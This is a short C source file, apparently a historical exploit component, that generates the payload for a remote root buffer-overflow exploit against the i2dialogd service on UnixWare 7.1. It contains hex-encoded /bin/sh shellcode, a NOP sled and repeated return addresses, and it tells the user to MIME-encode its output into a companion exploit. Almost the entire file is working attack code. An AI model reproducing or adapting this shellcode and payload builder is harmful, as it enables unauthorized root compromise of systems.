/* 
 * addr.c - Add-on for the UnixWare 7.1 remote root exploit in i2dialogd
 * simply MIME encode the output of this program and put into the 
 * appropriate place in uwi2.c
 * 
 * Usage: cc -o addr addr.c; ./addr <offset> <size>
 *
 * Brock Tellier btellier@usa.net
*/

#include <stdio.h>
#define NOP 0x90

char scoshell[]= 
  "\xeb\x1b\x5e\x31\xdb\x89\x5e\x07\x89\x5e\x0c\x88\x5e\x11\x31\xc0"
  "\xb0\x3b\x8d\x7e\x07\x89\xf9\x53\x51\x56\x56\xeb\x10\xe8\xe0\xff"
  "\xff\xff/bin/sh\xaa\xaa\xaa\xaa\x9a\xaa\xaa\xaa\xaa\x07\xaa";

void main(int argc, char *argv[]) {

  long addr;
  char buf[2000];
  int i;
  int offset;
  int size = 400;

  if (argc > 1) offset = atoi(argv[1]);
  if (argc > 2) size = atoi(argv[2]);

  addr=0x8046000 + offset;
  memset(buf, NOP, size);
  for(i=60;i<100;i+=4)*(int *)&buf[i]=addr;
  for(i = 0; i < strlen(scoshell); i++)
    buf[i+300] = scoshell[i];
  buf[size - 3] = ':'; 
  buf[size - 2] = 'A';
  buf[size - 1] = 0;
  fprintf(stderr, "using addr 0x%x with offset %d \n", addr, offset);
  fprintf(stderr, "mime-encode the stdoutput!\n");
  printf(buf);
}